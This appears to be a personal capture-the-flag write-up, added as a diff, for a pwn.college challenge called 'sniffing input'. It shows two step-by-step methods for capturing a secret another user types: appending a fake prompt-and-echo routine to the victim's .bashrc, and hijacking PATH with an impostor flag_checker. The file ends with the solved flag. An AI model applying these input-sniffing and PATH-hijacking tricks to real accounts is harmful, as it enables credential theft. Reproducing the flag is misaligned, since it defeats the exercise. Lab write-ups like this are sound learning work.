@@ -1,0 +1,53 @@
+# challenge: sniffing input
+
+📅 2025-06-19
+📁 silly shenanigas
+
+---
+
+## ✅ what i did  
+1° WAY -> working only w/ .bashrc (no flag_checker)
+-clicked start
+-opened the terminal
+-ran: 'which flag_checker' -> output: '/run/challenge/bin/flag_checker'
+-opened a new terminal
+-ran in the new terminal: 'vim /run/challenge/bin/flag_checker'
+-ran in the first terminal: 'vim /home/zardus/.bashrc'
+-added at the end:  'read garbage'
+                    'echo -n "Type the flag, victim: "'               -> copied/pasted the first 3 lines of flag_checker (displayed in the other terminal)
+                    'read -r candidate'
+                    'echo $candidate'
+-ran: '/challenge/victim'
+-flag popped out
+
+2° WAY -> using both .bashrc and flag_checker
+-clicked start
+-opened the terminal
+-ran: 'which flag_checker' -> output: '/run/challenge/bin/flag_checker'
+-ran: 'vim /run/challenge/bin/flag_checker'
+-opened a new terminal
+-ran in the new terminal: 'vim flag_checker'
+-copied/pasted the first 3rd and 4th line of the other terminal (displaying the flag_checker contents) to this one: 'echo -n "Type the flag, victim: "'
+                                                                                                                    'read -r candidate'
+                                                                                                                    'echo $candidate'
+-ran: 'chmod a+x flag_checker'
+-ran: 'echo $PATH'
+-copied the value
+-ran: 'vim /home/zardus/.bashrc'
+-added at the end: 'PATH=/home/hacker:[PASTED]'
+-ran: '/challenge/victim'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+1° WAY
+this was the first challenge that really pushed me untill now
+from flag_checker i understood its behavior and tried to replicate it in .bashrc
+after the login, zardus would have typed flag_checker to make the command run, so i decided to intercept it w/ 'read garbage' to avoid its execution
+then, i knew he would input the flag but obfuscate so i echoed it to see the value
+
+2° WAY
+i replicated flag_checker but this time it only asked for the flag, read it and echoed it.
+to make this one runnable instead of the original, i modified the PATH inside the .bashrc
+
+## 🏁 Flag  
+pwn.college{AnHIUtkjqaioe3TtanGkMRe1aXD.0VNzEzNxwCO4IDOxEzW}
